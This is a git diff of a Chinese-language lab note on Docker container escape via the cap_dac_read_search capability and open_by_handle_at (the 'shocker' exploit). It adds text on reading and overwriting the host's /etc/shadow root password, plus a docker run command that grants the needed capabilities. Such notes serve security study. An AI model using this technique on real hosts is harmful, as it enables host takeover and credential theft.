@@ -190,7 +190,7 @@ ee0b268deab89078348096c9877d2f05aff88ae6c1e6529600eb29cc32bebf1b
 
 ```
 
-拥有 cap_dac_read_search 的容器可以调用 open_by_handle_at 进行逃逸
+拥有 cap_dac_read_search 的容器可以调用 open_by_handle_at 进行逃逸，下面是读取宿主机的 /etc/shadow 文件
 
 ```
 ....
@@ -217,7 +217,30 @@ root@ee0b268deab8:/# ./shocker
 [***] forward to my friends who drink secury-tea too!      [***]
 [*] Resolving 'etc/shadow'
 [-] open_by_handle_at: Operation not permitted
+
 ```
+
+## 漏洞利用
+
+如果一个容器具备 cap_dac_read_search 可以通过修改宿主机的 /etc/shadow 的 root 用户密码，然后直接 root 登录到宿主机
+
+```
+┌──(kali㉿kali)-[~/containersec]
+└─$ sudo docker run -itd --name=ubuntu3 --cap-add=cap_dac_read_search --cap-add=cap_dac_override --cap-drop=all ubuntu
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 # 扩展
 
